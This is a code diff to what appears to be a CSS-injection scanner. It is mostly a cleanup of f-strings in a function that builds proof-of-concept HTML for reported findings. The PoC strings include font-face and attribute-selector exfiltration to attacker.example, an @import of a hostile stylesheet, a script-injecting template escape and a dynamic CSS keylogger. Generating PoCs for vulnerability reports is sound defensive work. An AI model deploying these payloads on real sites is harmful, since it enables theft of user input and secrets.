@@ -60,7 +60,7 @@ from typing import Any
 # HTML parsing -- try BeautifulSoup, fall back to regex
 # ---------------------------------------------------------------------------
 try:
-    from bs4 import BeautifulSoup  # type: ignore
+    from bs4 import BeautifulSoup  # type: ignore  # noqa: F401  (可选依赖可用性探测:导入即使用)
     _HAS_BS4 = True
 except ImportError:  # pragma: no cover -- bs4 is in requirements.txt
     _HAS_BS4 = False
@@ -501,17 +501,17 @@ def build_poc_html(url: str, violation_type: str,
         )
     if violation_type == "css_font_face_exfil":
         return (
-            f"<!-- @font-face unicode-range exfiltration PoC -->\n"
-            f"<style>\n"
-            f"@font-face {{\n"
-            f"  font-family: exfil;\n"
-            f"  src: url(https://attacker.example/?leak=1);\n"
-            f"  unicode-range: U+0041; /* 'A' -- one request per char */\n"
-            f"}}\n"
-            f"/* Repeat for each character code; the browser fires one\n"
-            f"   HTTP request per matching character in any element using\n"
-            f"   this font.  Bypasses CSP script-src (no JS executes). */\n"
-            f"</style>"
+            "<!-- @font-face unicode-range exfiltration PoC -->\n"
+            "<style>\n"
+            "@font-face {\n"
+            "  font-family: exfil;\n"
+            "  src: url(https://attacker.example/?leak=1);\n"
+            "  unicode-range: U+0041; /* 'A' -- one request per char */\n"
+            "}\n"
+            "/* Repeat for each character code; the browser fires one\n"
+            "   HTTP request per matching character in any element using\n"
+            "   this font.  Bypasses CSP script-src (no JS executes). */\n"
+            "</style>"
         )
     if violation_type == "css_selector_exfil":
         return (
@@ -524,28 +524,28 @@ def build_poc_html(url: str, violation_type: str,
         )
     if violation_type == "css_import_injection":
         return (
-            f"<!-- @import PoC: load attacker-controlled stylesheet -->\n"
-            f"<style>\n"
-            f"@import url(https://attacker.example/evil.css);\n"
-            f"</style>"
+            "<!-- @import PoC: load attacker-controlled stylesheet -->\n"
+            "<style>\n"
+            "@import url(https://attacker.example/evil.css);\n"
+            "</style>"
         )
     if violation_type in ("cssom_insertrule", "cssom_insertrule_import"):
         return (
-            f"<!-- CSSOM insertRule PoC -->\n"
-            f"<script>\n"
-            f"// If user input reaches insertRule():\n"
-            f"document.styleSheets[0].insertRule(\n"
-            f"  '@import url(https://attacker.example/evil.css)', 0\n"
-            f");\n"
-            f"</script>"
+            "<!-- CSSOM insertRule PoC -->\n"
+            "<script>\n"
+            "// If user input reaches insertRule():\n"
+            "document.styleSheets[0].insertRule(\n"
+            "  '@import url(https://attacker.example/evil.css)', 0\n"
+            ");\n"
+            "</script>"
         )
     if violation_type == "cssom_cssText":
         return (
-            f"<!-- CSSOM cssText sink PoC -->\n"
-            f"<script>\n"
-            f"// If user input reaches element.style.cssText:\n"
-            f"el.style.cssText = 'background:url(https://attacker/?leak=1)';\n"
-            f"</script>"
+            "<!-- CSSOM cssText sink PoC -->\n"
+            "<script>\n"
+            "// If user input reaches element.style.cssText:\n"
+            "el.style.cssText = 'background:url(https://attacker/?leak=1)';\n"
+            "</script>"
         )
     if violation_type in ("css_javascript_uri", "css_expression",
                           "css_moz_binding", "css_behavior"):
@@ -557,19 +557,19 @@ def build_poc_html(url: str, violation_type: str,
         )
     if violation_type == "css_template_reflection":
         return (
-            f"<!-- Template reflection into <style> PoC -->\n"
-            f"If the template variable contains '</style>', it escapes to\n"
-            f"HTML context.  Inject:  </style><script>alert(1)</script><style>"
+            "<!-- Template reflection into <style> PoC -->\n"
+            "If the template variable contains '</style>', it escapes to\n"
+            "HTML context.  Inject:  </style><script>alert(1)</script><style>"
         )
     if violation_type == "css_dynamic_exfil_gadget":
         return (
-            f"<!-- Dynamic CSS keylogger built in JS -->\n"
-            f"<script>\n"
-            f"var s = document.createElement('style');\n"
-            f"s.textContent = 'input[value^=\"' + char + '\"] {{ "
-            f"background:url(https://attacker/?' + char + ') }}';\n"
-            f"document.head.appendChild(s);\n"
-            f"</script>"
+            "<!-- Dynamic CSS keylogger built in JS -->\n"
+            "<script>\n"
+            "var s = document.createElement('style');\n"
+            "s.textContent = 'input[value^=\"' + char + '\"] { "
+            "background:url(https://attacker/?' + char + ') }';\n"
+            "document.head.appendChild(s);\n"
+            "</script>"
         )
     return f"<!-- CSSI PoC for {violation_type} on {url} -->"
 
